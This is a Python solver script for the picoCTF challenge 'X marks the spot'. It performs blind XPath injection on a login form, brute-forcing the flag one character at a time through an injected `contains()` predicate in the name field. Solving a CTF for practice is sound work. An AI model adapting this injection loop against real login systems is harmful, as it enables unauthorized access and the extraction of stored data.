# X marks the spot

# Another login you have to bypass. Maybe you can find an injection that works?
# Additional details will be available after launching your challenge instance.

# level : hard in picoCTF
# https://learn.cylabacademy.org/library/185?category=1&page=7

import requests
import string


url = "http://wily-courier.picoctf.net:63039/"

flag = "picoCTF{h0p3fully"

txt=string.printable

idx=0

while '}' not in flag:
    flag+=txt[idx]
    data={
        "name":f"' or //*[contains(.,\"{flag}\")] or 'x'='",
        "pass":"test"
    }
    print("[+] testing with",data["name"])
    respone = requests.post(url,data=data)

    if "on the right path." in respone.text:
        idx=0
        print(flag)
    else:
        flag=flag[:-1]
        idx+=1
        if idx>len(txt)-1:
           print("err") 
           break
print(flag)

